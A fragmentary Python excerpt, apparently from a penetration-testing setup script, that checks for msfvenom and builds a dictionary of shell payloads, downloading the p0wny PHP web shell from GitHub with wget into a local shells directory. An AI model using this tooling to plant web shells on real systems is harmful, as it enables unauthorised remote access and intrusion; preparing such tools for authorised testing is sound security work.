...
def ResetEnv():
	return any(flag in sys.argv for flag in ("-r", "--reset"))
...
def CheckIsMSFVenomIsInstalled():
	return bool(shutil.which("msfvenom"))
...
def GenerateShells():
	Payloads = {
		...
		"p0wny-shell":"https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php"
	}

	for FileName , Payload in tqdm(Payloads.items()):
		try:
			if FileName == "p0wny-shell":
				subprocess.run(["wget", Payload, "-O", f"{HomePath}/shells/p0wny-shell.php"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
			else:
